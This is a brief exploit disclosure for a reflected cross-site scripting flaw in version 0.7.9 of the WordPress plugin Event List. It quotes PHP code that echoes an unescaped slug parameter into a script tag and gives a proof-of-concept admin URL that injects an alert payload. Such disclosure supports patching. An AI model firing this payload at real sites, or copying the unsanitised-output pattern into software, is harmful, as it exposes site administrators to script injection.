
#### Exploit Title: WordPress Plugin Event List XSS vulnerability
#### Exploit Author: ning1022
#### Software Link: https://wordpress.org/plugins/event-list/
#### Version: 0.7.9



Vulnerability code

```

event-list/includes/admin-categories.php

$is_disabled = '1' == $this->options->get('el_sync_cats');
require_once(EL_PATH.'admin/includes/category_table.php');
$category_table = new EL_Category_Table($is_disabled);
$category_table->prepare_items();


```



```
/event-list/admin/includes/category_table.php

	private function process_bulk_action() {
		if(!$this->is_disabled) {
			//Detect when a bulk action is being triggered...
			if( 'delete_bulk' === $this->current_action() ) {
				// Show confirmation window before deleting
				echo '<script language="JavaScript">eventlist_deleteCategory ("'.implode( ', ', $_GET['slug'] ).'");</script>';
			}
		}
	}
	
	
```


Once user turn off the switch.(Sync Categories)

![http://ofjyzpv9h.bkt.clouddn.com/cve1-1.png](http://ofjyzpv9h.bkt.clouddn.com/cve1-1.png)


POC:
```
http://[wordpress_site]/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(1)>
```



![http://ofjyzpv9h.bkt.clouddn.com/cve1-2.png](http://ofjyzpv9h.bkt.clouddn.com/cve1-2.png)